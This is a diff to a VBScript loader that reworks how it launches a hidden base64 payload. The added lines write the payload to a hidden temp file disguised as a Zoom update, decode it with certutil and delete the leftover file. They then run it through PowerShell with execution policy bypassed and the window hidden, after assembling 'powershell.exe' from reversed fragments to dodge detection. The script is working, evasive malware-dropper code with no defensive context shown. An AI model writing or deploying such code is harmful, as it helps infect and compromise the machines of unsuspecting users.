@@ -16,7 +16,7 @@ Option Explicit
 
 Dim sh, fso, env, args, a
 Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
-Dim chunks, i, b64, psExe, psCmd
+Dim chunks, i, b64, psExe, psCmd, psFile, b64File, st
 
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -57,8 +57,19 @@ Next
 
 ' powershell.exe assembled from reversed fragments.
 psExe = U(Array("llehsrewop", ".", "exe"))
-psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
-        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & b64 & "'))|iex"""
+psFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.ps1"
+b64File = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.b64"
+Set st = CreateObject("ADODB.Stream")
+st.Type = 2
+st.Charset = "ascii"
+st.Open
+st.WriteText b64
+st.SaveToFile b64File, 2
+st.Close
+Set st = Nothing
+sh.Run "certutil.exe -f -decode """ & b64File & """ """ & psFile & """", 0, True
+fso.DeleteFile b64File, True
+psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"
 
 On Error Resume Next
 waitMode = (mode = "selftest")
